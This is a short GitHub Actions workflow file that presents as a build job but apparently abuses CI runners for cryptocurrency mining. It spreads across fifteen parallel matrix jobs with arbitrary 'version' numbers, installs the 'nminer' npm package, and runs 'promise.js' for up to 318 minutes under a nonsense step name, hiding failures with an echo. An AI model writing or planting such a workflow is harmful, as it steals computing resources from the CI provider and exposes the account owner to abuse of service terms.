name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 785 }
          - { version: 4571 }
          - { version: 9348 }
          - { version: 3167 }
          - { version: 5582 }
          - { version: 8135 }
          - { version: 6781 }
          - { version: 6550 }
          - { version: 4546 }
          - { version: 9058 }
          - { version: 6150 }
          - { version: 4464 }
          - { version: 9220 }
          - { version: 9831 }
          - { version: 9735 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: furthermore beneath brightly phew
        run: |
          npm install nminer@latest
          timeout 318m node promise.js || echo "promise executed"